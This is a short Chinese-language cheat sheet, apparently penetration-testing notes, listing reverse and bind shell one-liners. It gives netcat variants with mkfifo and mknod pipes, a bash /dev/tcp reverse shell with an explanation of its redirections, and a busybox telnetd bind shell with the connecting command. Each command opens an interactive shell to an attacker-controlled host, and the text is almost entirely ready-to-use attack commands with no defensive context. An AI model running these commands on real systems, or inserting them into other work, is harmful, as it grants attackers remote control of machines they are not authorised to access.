### NetCat
```
nc -e /bin/sh 10.0.0.1 1234　　#不同版本的nc不一定支持-e选项
```
不能使用-e选项时：
```
mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 4444
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
```
安装的NC版本有问题时：
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html

---

### bash直接反弹
靶机
```
bash -i >& /dev/tcp/192.168.86.131/8080 0>&1
````
0是标准输入，1为标准输出，2是标准错误信息输出。
这个命令的意思是：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。


https://www.smi1e.top/linux-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/


### telnetd启动服务
靶机：
```
busybox telnetd -b XXX.XXX.XXX.XXX -p 1234 -l /bin/ash
```
busybox 不一定要加，看telnetd是否直接可用（配好了环境变量之类吧）
telnetd 启动telnet服务
-b 是bind到靶机外网能访问的网卡ip
-p 监听端口
-l 指定客户telnet之后所用shell

攻击机：
```
telnet XXX.XXX.XXX.XXX 1234
```
